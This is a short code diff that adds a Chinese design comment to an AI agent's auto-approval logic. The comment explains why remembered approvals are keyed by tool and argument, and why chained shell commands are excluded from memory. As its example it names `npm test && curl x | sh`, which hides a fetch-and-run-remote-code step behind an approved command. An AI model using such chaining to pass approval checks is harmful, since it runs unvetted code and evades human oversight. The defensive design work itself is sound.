@@ -31,6 +31,12 @@ export class AutoApprover implements Approver {
  * 取整条命令太细（换个参数就要重问），只取工具名太粗（批准过一次 run_command
  * 就等于交出 shell）。两段是实践里的折中。
  *
+ * **这个键刻意不承担安全职责**，它只做归类。曾经想过把它改成"命令里所有程序名的集合"
+ * 来堵 `npm test && curl x | sh`（跟 `npm test` 撞同一个键），但那会让键变得更粗——
+ * `npm test` 会连带覆盖 `npm install`，比原来更危险。
+ * 真正的收口在产生请求的那一侧：组合命令由 `shellPlugin` 标上 `noMemory`，
+ * 于是它既不进记忆、也匹配不到记忆（见 `memorable()`）。
+ *
  * 没有字符串参数就退化成工具名。
  */
 export function memoryKey(req: ApprovalRequest): string {
